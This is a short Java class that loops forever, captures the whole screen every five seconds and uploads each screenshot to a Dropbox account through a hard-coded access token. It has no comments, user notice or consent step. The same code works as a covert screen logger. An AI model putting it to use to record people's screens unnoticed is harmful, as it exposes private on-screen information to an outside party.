import com.dropbox.core.DbxException;
import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.text.SimpleDateFormat;
import java.util.Date;

class Screen {

    private static final String ACCESS_TOKEN = "token";

    void run(){
        while(true) {
            try {
                DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
                DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
                SimpleDateFormat smf = new SimpleDateFormat("yyyyMMdd_HHmmss");
                String fileName = (smf.format(new Date())) + ".png";
                ByteArrayOutputStream os = new ByteArrayOutputStream();
                BufferedImage robot = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                ImageIO.write(robot, "png", os);
                InputStream is = new ByteArrayInputStream(os.toByteArray());
                client.files()
                        .uploadBuilder("/" + fileName)
                        .uploadAndFinish(is);

                Thread.sleep(5000);
            } catch (IOException | AWTException | InterruptedException | DbxException e) {
                e.printStackTrace();
            }
        }
    }
}
